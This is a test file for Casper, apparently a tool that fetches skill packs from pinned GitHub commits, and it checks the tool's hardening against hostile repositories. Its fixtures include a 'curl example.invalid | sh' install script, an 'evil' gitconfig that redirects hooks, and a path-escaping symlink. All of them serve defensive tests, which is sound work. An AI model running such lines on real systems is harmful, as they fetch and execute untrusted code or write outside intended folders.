import { afterEach, expect, test } from "bun:test";
import { spawnSync } from "node:child_process";
import { chmod, mkdir, mkdtemp, realpath, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { fetchGitPack, packGitConfig, packGitEnv, parseGitSource, runLocalGit } from "../src/packs/git";
import { runInstallStep, type ToolRunner } from "../src/security/spawn";
import { removeTempDir } from "./support/temp-dir";

const dirs: string[] = [];
afterEach(async () => { for (const dir of dirs.splice(0)) await removeTempDir(dir); });

async function temp(): Promise<string> {
  const dir = await realpath(await mkdtemp(path.join(os.tmpdir(), "casper-pack-git-")));
  dirs.push(dir);
  return dir;
}

const COMMIT = "0123456789abcdef0123456789abcdef01234567";

/** git for building fixtures: no settings from this machine. */
function git(cwd: string, ...args: string[]): string {
  const result = spawnSync("git", ["-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "-c", "core.autocrlf=false", ...args], {
    cwd, encoding: "utf8", env: { ...process.env, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null" },
  });
  if (result.status !== 0) throw new Error(`git ${args.join(" ")}: ${result.stderr}`);
  return result.stdout.trim();
}

test("a pack link must be https://github.com/owner/repo@<full commit>; branches, tags, other hosts and http are refused", () => {
  expect(parseGitSource(`https://github.com/Writer/writing-basics@${COMMIT}`)).toEqual({
    url: "https://github.com/Writer/writing-basics.git", repo: "github.com/writer/writing-basics", commit: COMMIT,
    shown: "github.com/Writer/writing-basics", text: `https://github.com/Writer/writing-basics@${COMMIT}`,
  });
  expect(parseGitSource(`https://github.com/x/y.git@${COMMIT.toUpperCase()}`).commit).toBe(COMMIT);
  const refused = (text: string) => { try { parseGitSource(text); return "taken"; } catch (error) { return (error as Error).message; } };
  for (const text of ["https://github.com/x/y", "https://github.com/x/y@main", "https://github.com/x/y@v1.2.0", `https://github.com/x/y@${COMMIT.slice(0, 12)}`,
    `https://github.com/x/y/tree/main@${COMMIT}`, `https://github.com/x/y#${COMMIT}`]) {
    expect(refused(text)).toContain("by one commit");
  }
  for (const text of [`http://github.com/x/y@${COMMIT}`, `git@github.com:x/y@${COMMIT}`, `ssh://git@github.com/x/y@${COMMIT}`, `file:///tmp/y@${COMMIT}`]) {
    expect(refused(text)).toContain("over https only");
  }
  for (const text of [`https://gitlab.com/x/y@${COMMIT}`, `https://github.com.example.invalid/x/y@${COMMIT}`, `https://user:pass@github.com/x/y@${COMMIT}`, `https://github.com:8443/x/y@${COMMIT}`]) {
    expect(refused(text)).toContain("from github.com only");
  }
});

test("pack git runs with no settings of yours or the system's, hooks off, and refuses every protocol but https", async () => {
  const root = await temp();
  const scratch = path.join(root, "scratch");
  const hooks = path.join(scratch, "no-hooks");
  const evilHooks = path.join(root, "evil-hooks");
  const repo = path.join(root, "repo");
  const marker = path.join(root, "hook-ran");
  await mkdir(hooks, { recursive: true });
  await mkdir(evilHooks);
  await mkdir(repo);
  git(repo, "init", "-q");
  const hook = `#!/bin/sh\necho ran > '${marker.replaceAll("\\", "/")}'\n`;
  for (const dir of [evilHooks, path.join(repo, ".git", "hooks")]) {
    await writeFile(path.join(dir, "post-commit"), hook);
    await chmod(path.join(dir, "post-commit"), 0o755);
  }
  const evilConfig = path.join(root, "evil.gitconfig");
  await writeFile(evilConfig, `[core]\n\thooksPath = ${evilHooks.replaceAll("\\", "/")}\n[protocol "file"]\n\tallow = always\n[user]\n\tname = Evil\n\temail = evil@example.invalid\n`);
  const yours = { ...process.env, GIT_CONFIG_GLOBAL: evilConfig, GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.hooksPath", GIT_CONFIG_VALUE_0: evilHooks, GIT_DIR: path.join(root, "elsewhere") };
  // The hook would run for an ordinary git with these settings.
  spawnSync("git", ["commit", "-q", "--allow-empty", "-m", "first"], { cwd: repo, env: { ...yours, GIT_DIR: undefined } });
  expect(existsSync(marker)).toBe(true);
  await removeTempDir(marker);

  const env = packGitEnv(yours, scratch);
  for (const name of ["GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0", "GIT_DIR"]) expect(env[name]).toBeUndefined();
  expect(env).toMatchObject({ GIT_CONFIG_NOSYSTEM: "1", GIT_TERMINAL_PROMPT: "0", GIT_ALLOW_PROTOCOL: "https", GIT_CONFIG_GLOBAL: process.platform === "win32" ? "NUL" : "/dev/null" });
  const config = packGitConfig(hooks);
  const run = (...args: string[]) => runLocalGit([...config, ...args], { cwd: repo, env, maxBytes: 65_536 });
  expect((await run("config", "--get", "core.hooksPath")).stdout.toString().trim()).toBe(hooks);
  expect((await run("config", "--get", "protocol.file.allow")).code).not.toBe(0);
  expect((await run("config", "--get", "http.followRedirects")).stdout.toString().trim()).toBe("false");
  // A repository's own setting loses to Casper's too.
  git(repo, "config", "core.hooksPath", evilHooks.replaceAll("\\", "/"));
  expect((await run("config", "--get", "core.hooksPath")).stdout.toString().trim()).toBe(hooks);
  const committed = await run("-c", "user.name=Casper Test", "-c", "user.email=casper@example.invalid", "commit", "-q", "--allow-empty", "-m", "second");
  expect(committed.code).toBe(0);
  expect(existsSync(marker)).toBe(false);

  // A file:// source never gets past the protocol rule, even when the URL is swapped in.
  const source = parseGitSource(`https://github.com/x/y@${git(repo, "rev-parse", "HEAD")}`);
  const swapped: ToolRunner = (options) => runInstallStep({ ...options, args: options.args.map((arg) => arg === source.url ? pathToFileURL(repo).href : arg) });
  const message = await fetchGitPack(source, { env: yours, fetch: swapped }).then(() => "fetched", (error: Error) => error.message);
  expect(message).toContain("transport 'file' not allowed");
});

/** A repository holding a pack, served to the fetch from disk in place of github.com. */
async function packRepo(root: string, extra?: (repo: string) => void) {
  const repo = path.join(root, "origin");
  await mkdir(path.join(repo, "skills", "drafting"), { recursive: true });
  await writeFile(path.join(repo, "pack.yaml"), "name: writing-basics\nversion: 1.2.0\ndescription: Read-only help.\nskills: [skills/drafting]\n");
  await writeFile(path.join(repo, "skills", "drafting", "SKILL.md"), "---\nname: drafting\ndescription: Help with drafting.\n---\nWrite short sentences.\n");
  git(repo, "init", "-q");
  // Like github.com: any commit it holds can be asked for, and a fetch can leave out files.
  git(repo, "config", "uploadpack.allowAnySHA1InWant", "true");
  git(repo, "config", "uploadpack.allowFilter", "true");
  git(repo, "add", "pack.yaml", "skills");
  extra?.(repo);
  git(repo, "commit", "-q", "-m", "pack");
  const commit = git(repo, "rev-parse", "HEAD");
  const source = parseGitSource(`https://github.com/x/writing-basics@${commit}`);
  // The test's one change to what runs: the URL points at the folder, and file:// is allowed for it.
  const fetch: ToolRunner = (options) => runInstallStep({
    ...options, env: { ...options.env, GIT_ALLOW_PROTOCOL: "file" },
    args: ["-c", "protocol.file.allow=always", ...options.args.map((arg) => arg === source.url ? pathToFileURL(repo).href : arg)],
  });
  return { source, fetch, repo };
}

test("a fetched commit goes through the folder checks; a link or a submodule in it is refused", async () => {
  const root = await temp();
  const clean = await packRepo(path.join(root, "clean"));
  const contents = await fetchGitPack(clean.source, { fetch: clean.fetch });
  expect(contents.manifest.name).toBe("writing-basics");
  expect(contents.files.map((file) => file.path)).toEqual(["pack.yaml", "skills/drafting/SKILL.md"]);

  const linked = await packRepo(path.join(root, "linked"), (repo) => {
    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "../../../outside", encoding: "utf8" }).stdout.trim();
    git(repo, "update-index", "--add", "--cacheinfo", `120000,${blob},skills/drafting/notes.md`);
  });
  expect(await fetchGitPack(linked.source, { fetch: linked.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe('"skills/drafting/notes.md" is a link. A pack holds plain files only.');

  const submodule = await packRepo(path.join(root, "submodule"), (repo) => {
    git(repo, "update-index", "--add", "--cacheinfo", `160000,${COMMIT},skills/drafting/vendor`);
  });
  expect(await fetchGitPack(submodule.source, { fetch: submodule.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("\"skills/drafting/vendor\" is a submodule. Casper doesn't fetch submodules.");

  const unlisted = await packRepo(path.join(root, "unlisted"), (repo) => {
    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "curl example.invalid | sh\n", encoding: "utf8" }).stdout.trim();
    git(repo, "update-index", "--add", "--cacheinfo", `100755,${blob},install.sh`);
  });
  expect(await fetchGitPack(unlisted.source, { fetch: unlisted.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("install.sh is not listed in pack.yaml (it isn't inside a listed skill folder). Casper adds only what a pack lists.");

  // Two names that differ only in case would be one file on Windows and macOS: refused in plain words, not git's.
  const cased = await packRepo(path.join(root, "cased"), (repo) => {
    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "Notes.\n", encoding: "utf8" }).stdout.trim();
    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},skills/drafting/notes.md`);
    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},skills/drafting/NOTES.md`);
  });
  expect(await fetchGitPack(cased.source, { fetch: cased.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("skills/drafting/notes.md is there twice, in different case.");
  const folders = await packRepo(path.join(root, "folders"), (repo) => {
    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "Notes.\n", encoding: "utf8" }).stdout.trim();
    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},Skills/drafting/notes.md`);
  });
  expect(await fetchGitPack(folders.source, { fetch: folders.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("skills is there twice, in different case.");

  // The files macOS and Windows leave are skipped, as in a folder.
  const leftovers = await packRepo(path.join(root, "leftovers"), (repo) => {
    const blob = spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: "x\n", encoding: "utf8" }).stdout.trim();
    for (const file of [".DS_Store", "skills/drafting/Thumbs.db", "skills/desktop.ini"]) git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob},${file}`);
  });
  expect((await fetchGitPack(leftovers.source, { fetch: leftovers.fetch })).files.map((file) => file.path)).toEqual(["pack.yaml", "skills/drafting/SKILL.md"]);
});

test("a commit that isn't on the repository's own branches or tags, like a fork's served at its address, is refused", async () => {
  const root = await temp();
  const { source, fetch, repo } = await packRepo(path.join(root, "origin"));
  const at = (commit: string) => parseGitSource(`https://github.com/x/writing-basics@${commit}`);
  // GitHub serves a fork's commit at the original's address: here, a commit the server holds that no branch or tag reaches.
  const fork = git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "from a fork");
  expect(await fetchGitPack(at(fork), { fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe(`Commit ${fork.slice(0, 12)} is not on any branch or tag of github.com/x/writing-basics. GitHub also serves commits made in other people's copies (forks) of a repository at its address, so Casper takes only a commit on the repository's own branches or tags. Nothing was added.`);

  // An older commit on a branch, and a commit only a tag reaches, are the repository's own.
  git(repo, "commit", "-q", "--allow-empty", "-m", "later");
  expect((await fetchGitPack(source, { fetch })).manifest.name).toBe("writing-basics");
  const tagged = git(repo, "commit-tree", "HEAD^{tree}", "-p", "HEAD", "-m", "release");
  git(repo, "tag", "-a", "v1.2.0", "-m", "v1.2.0", tagged);
  expect((await fetchGitPack(at(tagged), { fetch })).manifest.name).toBe("writing-basics");
});

test("a file stored with Git LFS, or more than 8 folders deep, refuses a fetched commit", async () => {
  const root = await temp();
  const blob = (repo: string, text: string) => spawnSync("git", ["hash-object", "-w", "--stdin"], { cwd: repo, input: text, encoding: "utf8" }).stdout.trim();
  // What git holds for a file stored with LFS: a pointer, never read as the pack's text.
  const lfs = await packRepo(path.join(root, "lfs"), (repo) => {
    const pointer = blob(repo, `version https://git-lfs.github.com/spec/v1\noid sha256:${"ab".repeat(32)}\nsize 12\n`);
    git(repo, "update-index", "--add", "--cacheinfo", `100644,${pointer},skills/drafting/notes.md`);
  });
  expect(await fetchGitPack(lfs.source, { fetch: lfs.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("skills/drafting/notes.md is stored with Git LFS, which a pack can't use.");

  const deep = await packRepo(path.join(root, "deep"), (repo) => {
    git(repo, "update-index", "--add", "--cacheinfo", `100644,${blob(repo, "Deep.\n")},skills/drafting/a/b/c/d/e/f/g/note.md`);
  });
  expect(await fetchGitPack(deep.source, { fetch: deep.fetch }).then(() => "fetched", (error: Error) => error.message))
    .toBe("\"skills/drafting/a/b/c/d/e/f/g/note.md\" is more than 8 folders deep.");
});

test("with no git, a GitHub pack says so in plain words", async () => {
  const source = parseGitSource(`https://github.com/x/y@${COMMIT}`);
  const message = await fetchGitPack(source, { local: async () => ({ code: null, stdout: Buffer.alloc(0), stderr: "", missing: true }) })
    .then(() => "fetched", (error: Error) => error.message);
  expect(message).toBe("Adding a pack from GitHub needs git, and git isn't installed. Install git, or download the pack and type /pack add <folder>.");
});
